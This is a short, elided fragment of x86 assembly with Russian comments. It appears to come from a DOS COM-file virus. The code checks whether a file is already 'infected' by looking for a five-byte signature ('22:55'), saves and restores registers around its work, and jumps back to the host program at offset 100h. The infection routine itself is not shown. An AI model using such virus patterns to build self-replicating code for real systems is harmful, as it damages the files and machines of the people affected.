...
mov si,offset Name_virus                        ;Проверям, "заражён" ли файл.
mov di,ax
add di,dx
...
pushf                                           ;Сохраним значения флагов.
pusha                                           ;Сохраним значения основных регистров.
...
popf                                            ;Восстановим флаги.ю

push 100h                                       ;Эквивалентно jmp 100h.
ret

Name_virus db '22:55'                           ;Наш идентификатор - последние пять байт.
